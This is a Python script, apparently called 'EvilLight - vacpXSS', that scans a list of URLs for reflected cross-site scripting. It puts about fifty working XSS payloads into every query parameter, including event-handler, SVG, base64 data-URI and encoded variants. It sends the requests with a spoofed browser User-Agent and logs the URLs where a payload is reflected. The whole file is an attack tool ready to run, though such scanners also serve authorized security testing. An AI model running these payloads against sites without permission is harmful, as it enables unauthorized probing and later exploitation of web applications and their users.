import requests
import urllib.parse
import argparse
from colorama import init, Fore

init()

rd = Fore.RED
g = Fore.GREEN
reset = Fore.RESET

parse = argparse.ArgumentParser(description="EvilLight - vacpXSS")
parse.add_argument('-f', help='File with URLs to scan')
parse.add_argument('-o', default='xss_evillight.txt' ,help='Write URLs Find in archive .txt')

args = parse.parse_args()


payloads = [
            "<script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<div onmouseover=\"alert('XSS')\">Hover over me</div>",
            "<img src=\"x\" onerror=\"(function(){alert('XSS')})()\">",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<marquee onstart=alert('XSS')>",
            "<details ontoggle=\"alert('XSS')\">",
            "<select autofocus onfocus=alert('XSS')>",
            "<video src=1 onerror=alert('XSS')>",
            "<audio src=1 onerror=alert('XSS')>",
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
            "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
            "<svg><set attributeName=onload value=alert('XSS')>",
            "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">",
            "<form><button formaction=javascript:alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<body onpageshow=alert('XSS')>",
            "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('XSS')\"></xss>",
            "<link rel=import href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
            "<iframe srcdoc=\"<img src=x onerror=alert('XSS')>\">",
            "<table background=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert('XSS')&NewLine;>X</a>",
            "<script src=\"data:text/javascript,alert('XSS')\"></script>",
            "<svg><script>alert('XSS')</script>",
            "<img src=x:alert('XSS') onerror=eval(src)>",
            "<img src=x:alert('XSS') onerror=eval(src)>",
            "<svg><a><animate attributeName=href values=javascript:alert('XSS') /><text x=20 y=20>Click me</text></a>",
            "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert('XSS') /><a id=xss><text x=20 y=20>Click me</text></a>",
            "<svg><set attributeName=onload value=alert('XSS')>",
            "<svg><animate attributeName=onload values=alert('XSS')>",
            "<svg><script xlink:href=data:,alert('XSS')></script>",
            "<math><mtext><table><mglyph src=x onerror=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>Click me</button>",
            "<isindex type=image src=x onerror=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<svg><script>alert&#40;'XSS'&#41;</script>",
            "<svg><script>alert&#x28;'XSS'&#x29;</script>",
            "onclick=prompt(8)><svg/onload=prompt(8)>"
        ]

payloadSuccess = []


if args.f and args.o:
    with open(args.f, 'r') as file:
        url = file.readlines()

    for URL in url:
        for payload in payloads:
            urlparsed = urllib.parse.urlparse(URL)
            url_query = urlparsed.query
            qs = urllib.parse.parse_qsl(url_query)
            query_descom = qs.copy()
            query_descom = [(key, payload ) for key, _ in qs]
            new_query = urllib.parse.urlencode(query_descom)
            urlFull = urllib.parse.urlunparse(urlparsed._replace(query=new_query))
                
            headers = {'User-Agent':"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"}
            r = requests.get(urlFull, headers=headers, timeout=5)
        
            if payload in r.text:
                print(f"{rd}[ XSS FOUND ] {urlFull}")
                print(g+"[+]")
                payloadSuccess.append(urlFull)
            else:
                pass
    print(f"{g}\nScan Success. XSS Found: {len(payloadSuccess)}")
    with open(args.o, 'w') as file:
        for url in payloadSuccess:
            file.write(url)